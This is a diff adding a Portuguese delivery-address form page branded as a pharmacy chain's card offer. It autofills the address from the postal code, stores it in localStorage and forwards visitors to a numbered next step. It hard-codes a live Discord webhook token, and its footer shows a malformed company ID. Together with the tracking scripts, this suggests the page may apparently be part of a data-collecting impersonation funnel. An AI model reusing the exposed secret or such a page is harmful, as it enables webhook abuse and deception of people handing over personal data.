@@ -1,0 +1,534 @@
+<!DOCTYPE html><html lang="pt-BR"><head><script src="/ml/progress.js"></script><script src="/api/public/pixel.js"></script><script src="/ml/lead-capture.js" defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Endereço de Entrega</title>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script src="/ml/utmify.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+    <script src="js/jquery.min.js"></script>
+    <script src="js/jquery.mask.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Sora', sans-serif;
+            background-color: #f5f5f5;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #d5d8dd;
+            background-color: #e9ebee;
+        }
+        .logo {
+            width: 125px;
+            margin-left: 20px;
+            padding: 10px;
+        }
+
+        .content {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .form-col {
+            flex: 1;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 3px;
+            color: #333;
+            font-size: 13px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 15px;
+            font-family: 'Sora', sans-serif;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-top: 5px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            margin-right: 8px;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #14315c;
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Sora', sans-serif;
+            box-shadow: 0 4px 8px rgba(255,230,0,0.3);
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #e6cf00;
+        }
+
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .estado-select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 15px;
+            font-family: 'Sora', sans-serif;
+            background-color: white;
+        }
+    </style>
+    <script>
+        // Move a variável para escopo global
+        let cepsNotificados = new Set(); // Evita spam no Discord
+
+        $(document).ready(function() {
+            $('#cep').mask('00000-000');
+            
+            function limpaFormulario() {
+                $("#endereco").val("");
+                $("#bairro").val("");
+                $("#cidade").val("");
+                $("#estado").val("");
+            }
+            
+            $("#cep").blur(function() {
+                var cep = $(this).val().replace(/\D/g, '');
+                
+                if (cep != "") {
+                    var validacep = /^[0-9]{8}$/;
+                    
+                    if(validacep.test(cep)) {
+                        // Mostra loader
+                        mostrarLoader();
+                        
+                        // Tenta API Brasil primeiro
+                        fetch(`https://brasilapi.com.br/api/cep/v1/${cep}`)
+                            .then(response => {
+                                if (response.ok) { // Status 200-299
+                                    return response.json();
+                                } else if (response.status === 404) {
+                                    throw new Error('CEP_NAO_ENCONTRADO');
+                                } else {
+                                    throw new Error('API_BRASIL_FALHOU');
+                                }
+                            })
+                            .then(dados => {
+                                if (dados.cep) {
+                                    $("#endereco").val(dados.street);
+                                    $("#bairro").val(dados.neighborhood);
+                                    $("#cidade").val(dados.city);
+                                    $("#estado").val(dados.state);
+                                    esconderLoader();
+                                } else {
+                                    throw new Error('CEP_NAO_ENCONTRADO');
+                                }
+                            })
+                            .catch(erro => {
+                                if (erro.message === 'CEP_NAO_ENCONTRADO') {
+                                    // CEP não existe, tenta ViaCEP
+                                    $.getJSON("https://viacep.com.br/ws/"+ cep +"/json/?callback=?", function(dados) {
+                                        if (!("erro" in dados)) {
+                                            $("#endereco").val(dados.logradouro);
+                                            $("#bairro").val(dados.bairro);
+                                            $("#cidade").val(dados.localidade);
+                                            $("#estado").val(dados.uf);
+                                            esconderLoader();
+                                        } else {
+                                            // CEP não existe em nenhuma API - CORRIGIDO
+                                            mostrarMensagemManual('cep_inexistente', cep);
+                                            esconderLoader();
+                                        }
+                                    }).fail(function() {
+                                        // ViaCEP com problema técnico (timeout, erro de rede, etc.)
+                                        mostrarMensagemManual('problema_tecnico', cep);
+                                        esconderLoader();
+                                    });
+                                } else {
+                                    // API Brasil com problema técnico, tenta ViaCEP
+                                    $.getJSON("https://viacep.com.br/ws/"+ cep +"/json/?callback=?", function(dados) {
+                                        if (!("erro" in dados)) {
+                                            $("#endereco").val(dados.logradouro);
+                                            $("#bairro").val(dados.bairro);
+                                            $("#cidade").val(dados.localidade);
+                                            $("#estado").val(dados.uf);
+                                            esconderLoader();
+                                        } else {
+                                            // CEP não existe em nenhuma API - CORRIGIDO
+                                            mostrarMensagemManual('cep_inexistente', cep);
+                                            esconderLoader();
+                                        }
+                                    }).fail(function() {
+                                        // Ambas com problema técnico
+                                        mostrarMensagemManual('problema_tecnico', cep);
+                                        esconderLoader();
+                                    });
+                                }
+                            });
+                    }
+                    else {
+                        limpaFormulario();
+                        $("#cep").val("");
+                        $(".error-message").remove();
+                        $("#cep").after('<div class="error-message" style="color: #dc3545; font-size: 14px; margin-top: 5px;">Formato de CEP inválido. Por favor, verifique e tente novamente.</div>');
+                        setTimeout(function() {
+                            $(".error-message").fadeOut(function() {
+                                $(this).remove();
+                            });
+                        }, 2000);
+                    }
+                }
+                else {
+                    limpaFormulario();
+                }
+            });
+        });
+
+        function mostrarLoader() {
+            $(".loader").remove();
+            
+            $("#cep").after(`
+                <div class="loader" style="
+                    text-align: center; 
+                    padding: 15px; 
+                    margin-top: 10px;
+                    background-color: #f8f9fa;
+                    border-radius: 5px;
+                    border: 1px solid #e9ecef;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                ">
+                    <div style="
+                        display: inline-block;
+                        width: 20px;
+                        height: 20px;
+                        border: 3px solid #14315c;
+                        border-radius: 50%;
+                        border-top-color: transparent;
+                        animation: spin 1s ease-in-out infinite;
+                        margin-right: 10px;
+                        flex-shrink: 0;
+                    "></div>
+                    <span style="color: #666; font-size: 14px;">Buscando endereço...</span>
+                </div>
+            `);
+        }
+
+        function esconderLoader() {
+            $(".loader").fadeOut(function() {
+                $(this).remove();
+            });
+        }
+
+        function mostrarMensagemManual(tipoErro, cep) {
+            $(".error-message").remove();
+            esconderLoader();
+            
+            // Limpa os campos
+            $("#endereco").val("");
+            $("#bairro").val("");
+            $("#cidade").val("");
+            $("#estado").val("");
+            
+            // Mesma mensagem para o usuário em ambos os casos
+            $("#cep").after(`
+                <div class="error-message" style="
+                    color: #856404; 
+                    background-color: #fff3cd; 
+                    border: 1px solid #ffeaa7; 
+                    border-radius: 5px; 
+                    padding: 10px; 
+                    font-size: 14px; 
+                    margin-top: 5px;
+                    text-align: center;
+                ">
+                    <i class="fas fa-info-circle" style="margin-right: 5px;"></i>
+                    <strong>CEP não encontrado automaticamente</strong><br>
+                    Por favor, preencha os campos de endereço manualmente.
+                </div>
+            `);
+            
+            // Notifica Discord apenas uma vez por CEP/erro
+            const chaveNotificacao = `${cep}_${tipoErro}`;
+            if (!cepsNotificados.has(chaveNotificacao)) {
+                notificarDiscord(cep, tipoErro);
+                cepsNotificados.add(chaveNotificacao);
+                
+                // Remove da lista após 1 hora
+                setTimeout(() => {
+                    cepsNotificados.delete(chaveNotificacao);
+                }, 3600000);
+            }
+            
+            setTimeout(function() {
+                $(".error-message").fadeOut(function() {
+                    $(this).remove();
+                });
+            }, 5000);
+        }
+
+        function notificarDiscord(cep, tipoErro) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1387481052473196619/NHSQZmzoxiN4BtaJC0rGGFhvETCvy7Gx3_-ctVZQcqIxEL-RhCvBgdTp0El5HOd66l8q';
+            
+            let titulo, descricao, cor, emoji;
+            
+            if (tipoErro === 'cep_inexistente') {
+                titulo = "CEP INEXISTENTE";
+                descricao = "Usuário digitou um CEP que não existe na base de dados";
+                cor = 16776960; // Amarelo
+                emoji = "🔍";
+            } else {
+                titulo = "🚨 PROBLEMA TÉCNICO NAS APIs";
+                descricao = "Ambas as APIs de CEP apresentaram problemas técnicos";
+                cor = 15158332; // Vermelho
+                emoji = "🚨";
+            }
+            
+            const payload = {
+                "content": null,
+                "embeds": [
+                    {
+                        "title": titulo,
+                        "description": descricao,
+                        "color": cor,
+                        "fields": [
+                            {
+                                "name": `${emoji} CEP Tentado`,
+                                "value": cep,
+                                "inline": true
+                            }
+                        ],
+                        "footer": {
+                            "text": "Sistema de Monitoramento - APIs CEP"
+                        },
+                        "timestamp": new Date().toISOString()
+                    }
+                ]
+            };
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Notificação enviada para Discord com sucesso');
+                } else {
+                    console.error('Falha ao enviar notificação para Discord');
+                }
+            })
+            .catch(error => {
+                console.error('Erro ao enviar notificação para Discord:', error);
+            });
+        }
+
+        function salvarEndereco() {
+            const endereco = {
+                logradouro: document.getElementById('endereco').value,
+                numero: document.getElementById('numero').value,
+                complemento: document.getElementById('complemento').value,
+                bairro: document.getElementById('bairro').value,
+                cidade: document.getElementById('cidade').value,
+                estado: document.getElementById('estado').value,
+                cep: document.getElementById('cep').value
+            };
+
+            try {
+                localStorage.setItem('enderecoEntrega', JSON.stringify(endereco));
+                console.log('Endereço salvo com sucesso:', endereco);
+                
+                const nextUrl = buildUrlWithParams('../12-2/index.html');
+                window.location.href = nextUrl;
+            } catch (erro) {
+                console.error('Erro ao salvar endereço:', erro);
+                alert('Ocorreu um erro ao salvar o endereço. Por favor, tente novamente.');
+            }
+        }
+    </script>
+
+    <!-- Adiciona CSS para a animação do spinner -->
+    <style>
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+<style id="lov-white-bg">html,body{background-color:#fff !important;background-image:none !important;}</style>
+</head>
+<body>
+    <div class="header">
+        <img src="logo.png" alt="Logo Drogarias Campeã" class="logo">
+    </div>
+
+    <div class="content">
+        <h1>Endereço de Entrega</h1>
+        <p class="subtitle">Onde você deseja receber seu cartão</p>
+
+        <form id="endereco-form" onsubmit="event.preventDefault(); salvarEndereco();">
+            <div class="form-group">
+                <label for="cep">CEP</label>
+                <input type="text" id="cep" name="cep" maxlength="9" placeholder="00000-000" required="" onkeyup="if(this.value.length >= 9) this.blur();">
+            </div>
+            
+            <div class="form-group">
+                <label for="endereco">Endereço</label>
+                <input type="text" id="endereco" name="endereco" required="">
+            </div>
+            
+            <div class="form-row">
+                <div class="form-col" style="flex: 0.4;">
+                    <label for="numero">Número</label>
+                    <input type="text" id="numero" name="numero" required="">
+                </div>
+                <div class="form-col" style="flex: 0.6;">
+                    <label for="complemento">Complemento (opcional)</label>
+                    <input type="text" id="complemento" name="complemento">
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="bairro">Bairro</label>
+                <input type="text" id="bairro" name="bairro" required="">
+            </div>
+            
+            <div class="form-row">
+                <div class="form-col" style="flex: 0.6;">
+                    <label for="cidade">Cidade</label>
+                    <input type="text" id="cidade" name="cidade" required="">
+                </div>
+                <div class="form-col" style="flex: 0.4;">
+                    <label for="estado">Estado</label>
+                    <select id="estado" name="estado" required="" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; font-family: 'Sora', sans-serif; font-size: 16px; color: #333; height: 40px; background-color: #fff; appearance: auto;">
+                        <option value="">Selecione</option>
+                        <option value="AC">AC</option>
+                        <option value="AL">AL</option>
+                        <option value="AP">AP</option>
+                        <option value="AM">AM</option>
+                        <option value="BA">BA</option>
+                        <option value="CE">CE</option>
+                        <option value="DF">DF</option>
+                        <option value="ES">ES</option>
+                        <option value="GO">GO</option>
+                        <option value="MA">MA</option>
+                        <option value="MT">MT</option>
+                        <option value="MS">MS</option>
+                        <option value="MG">MG</option>
+                        <option value="PA">PA</option>
+                        <option value="PB">PB</option>
+                        <option value="PR">PR</option>
+                        <option value="PE">PE</option>
+                        <option value="PI">PI</option>
+                        <option value="RJ">RJ</option>
+                        <option value="RN">RN</option>
+                        <option value="RS">RS</option>
+                        <option value="RO">RO</option>
+                        <option value="RR">RR</option>
+                        <option value="SC">SC</option>
+                        <option value="SP">SP</option>
+                        <option value="SE">SE</option>
+                        <option value="TO">TO</option>
+                    </select>
+                </div>
+            </div>
+
+            <button type="submit" class="button">
+                Continuar
+            </button>
+        </form>
+    </div>
+
+    <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
+        <div style="max-width: 600px; margin: 0 auto;">
+            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                Drogarias Campeã S.A. | CNPJ: 79.379.491.0008-50
+            </p>
+            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                Rod. Antônio Heil, 250 - Centro II, Brusque - SC, 88353-100
+            </p>
+            <p style="color: #999; font-size: 9px; margin-top: 5px;">
+                © 2025 - Todos os direitos reservados
+            </p>
+        </div>
+    </footer>
+
+    <script>
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        function buildUrlWithParams(baseUrl) {
+                const params = getUrlParams();
+                const url = new URL(baseUrl, window.location);
+                Object.keys(params).forEach(key => {
+                    url.searchParams.append(key, params[key]);
+                });
+                
+                return url.toString();
+            }
+    </script>
+    
+
+
+
+</body></html>
